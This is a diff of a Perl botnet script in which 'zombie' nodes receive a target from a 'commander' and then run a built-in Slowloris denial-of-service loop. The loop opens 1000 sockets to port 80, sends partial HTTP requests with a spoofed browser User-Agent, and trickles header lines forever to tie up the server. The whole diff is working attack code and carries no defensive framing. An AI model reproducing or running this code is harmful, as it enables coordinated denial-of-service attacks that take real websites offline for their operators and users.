@@ -62,7 +62,9 @@ sub zombie {
         my $c_socket = $socket->accept();
         my $target = '';
         $c_socket->recv($target, 1024);
-        system("/home/jieliau/Tools/slowloris.pl/slowloris.pl -dns $target");
+        chomp $target;
+        dohttpconnection($target);
+        #system("/home/jieliau/Tools/slowloris.pl/slowloris.pl -dns $target");
     }
     $socket->close();
 }
@@ -91,69 +93,28 @@ sub commander {
 
 sub dohttpconnection {
     my($target) = @_;
-    my($rand, @first, @sock, @working);
+    my(@sock, $primarypayload);
     my $num = 1000;
-    my $fail_connection = 0;
-    $working[$_] = 0 foreach (1..$num);
-    $first[$_] = 0 foreach (1..$num);
     while(1) {
-        $fail_connection = 0;
-        print "Building sockets!!!\n";
-        foreach my $i (1..$num) {
-            if($working[$i] == 0) {
-                if(
-                    $sock[$i] = new IO::Socket::INET(
-                        PeerAddr => "$target", 
-                        PeerPort => "80", 
-                        Timeout => "5", 
-                        Proto => "tcp"
-                    )
-                ) {
-                    $working[$i] = 1;
-                } else {
-                    $working[$i] = 0;
-                }
-                if($working[$i] == 1) {
-                    $rand = "";
-                }
-                my $primarypayload = 
-                    "GET/$rand HTTP/1.1\r\n"
-                    . "Host: $target\r\n"
-                    . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50313; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
-                    . "Content-Length: 42\r\n";
-                my $handle = $sock[$i];
-                if($handle) {
-                    print $handle "$primarypayload";
-                    if($SIG{__WARN__}) {
-                        $working[$i] = 0;
-                        close $handle;
-                        $fail_connection++;
-                    } else {
-                        $working[$i] = 1;
-                    }
-                } else {
-                    $working[$i] = 0;
-                    $fail_connection++;
-                }
+        foreach my $i (1..$num){
+            print "Building sockets.\n";
+            $sock[$i] = new IO::Socket::INET(
+                PeerHost => "$target", 
+                PeerPort => '80', 
+                Proto => 'tcp'
+            );
+            die "Unable to connect to $target: $!\n" unless $sock[$i];
+            $primarypayload = "GET / HTTP/1.1\r\n"."Host: $target\r\n"."User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50313; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"."Content-Length: 42\r\n";
+            my $handle = $sock[$i];
+            if($handle) {
+                print $handle "$primarypayload";
             }
         }
         print "Sending data!!!\n";
-        foreach my $i (1..$num) {
-            if($working[$i] == 1) {
-                if($sock[$i]) {
-                    my $handle = $sock[$i];
-                    if(print $handle "X-a: b\r\n") {
-                        $working[$i] = 1;
-                    } else {
-                        $working[$i] = 0;
-                        $fail_connection++;
-                    }
-                } else {
-                    $working[$i] = 0;
-                    $fail_connection++;
-                }
-            }
+        foreach my $i (1..$num){
+            my $handle = $sock[$i];
+            print $handle "X-a: b\r\n";
         }
+        #sleep(100);
     }
-    sleep(100);
 }
